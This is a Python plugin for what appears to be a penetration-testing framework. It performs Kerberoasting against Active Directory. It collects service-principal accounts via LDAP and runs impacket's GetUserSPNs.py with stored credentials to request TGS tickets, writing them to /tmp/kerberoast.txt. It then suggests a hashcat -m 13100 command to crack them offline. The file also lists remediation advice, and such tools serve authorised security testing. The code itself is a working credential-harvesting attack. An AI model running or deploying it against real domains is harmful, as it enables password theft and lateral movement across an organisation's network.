"""Kerberoasting — request TGS tickets for SPNs, crack offline."""

from __future__ import annotations

import logging
from typing import ClassVar

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target

logger = logging.getLogger(__name__)


class KerberoastPlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="kerberoast",
        display_name="Kerberoasting",
        category=PluginCategory.LATERAL,
        description="Request TGS tickets for SPNs → offline password cracking",
        depends_on=["ldap_enum"],
        produces=["kerberos_tickets", "credentials"],
        timeout=60.0,
        requires_http=False,
        requires_credentials=True,
        risk_level="noisy",
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        findings: list[Finding] = []
        data: dict = {"spn_users": [], "tickets": [], "cracked": []}

        # Get SPN users from ldap_enum
        ldap_result = ctx.pipeline.get(f"ldap_enum:{target.host}")
        spn_users = []
        if ldap_result and ldap_result.ok:
            spn_users = ldap_result.data.get("spn_users", [])

        if not spn_users and ctx.ldap:
                try:
                    spns = await ctx.ldap.get_spns()
                    spn_users = [
                        {
                        "username": s.get("sAMAccountName", ""),
                        "spn": s.get("servicePrincipalName", ""),
                    }
                        for s in spns
                    ]
                except Exception as exc:
                    logger.debug("LDAP SPN query failed: %s", exc)

        if not spn_users:
            findings.append(Finding.info(
                "No SPN users found for Kerberoasting",
                tags=["lateral", "kerberos"],
            ))
            return PluginResult.success(
                self.meta.name, target.host, findings=findings, data=data,
            )

        data["spn_users"] = spn_users[:50]

        # Request TGS tickets using impacket
        if ctx.subprocess_mgr:
            domain = target.meta.get("ad_domain", "")
            dc_ip = target.meta.get("dc_ip", target.host)

            # Try GetUserSPNs.py from impacket
            cred = None
            if ctx.creds:
                creds_list = ctx.creds.get_for_target(target.host)
                if creds_list:
                    cred = creds_list[0]

            if cred and domain:
                cmd = (
                    f"GetUserSPNs.py {domain}/{cred.username}:{cred.secret} "
                    f"-dc-ip {dc_ip} -request -outputfile /tmp/kerberoast.txt"
                )
                result = await ctx.subprocess_mgr.run(cmd, timeout=30)
                if result.returncode == 0 and result.stdout:
                    data["tickets"] = result.stdout.strip().splitlines()

        # Report findings
        findings.append(Finding.high(
            f"Kerberoastable accounts: {len(spn_users)}",
            evidence="\n".join(
                f"{u.get('username', 'N/A')}: {u.get('spn', 'N/A')}"
                for u in spn_users[:15]
            ),
            description=(
                "These accounts have SPNs and their TGS tickets can be "
                "requested and cracked offline without further privileges"
            ),
            remediation="Use strong passwords (25+), managed service accounts, or AES-only",
            tags=["lateral", "kerberos", "kerberoast"],
        ))

        if data["tickets"]:
            findings.append(Finding.critical(
                f"TGS tickets obtained: {len(data['tickets'])}",
                evidence="Tickets saved for offline cracking",
                description="Crack with: hashcat -m 13100 kerberoast.txt wordlist.txt",
                tags=["lateral", "kerberos", "credential"],
            ))

        return PluginResult.success(
            self.meta.name, target.host, findings=findings, data=data,
        )
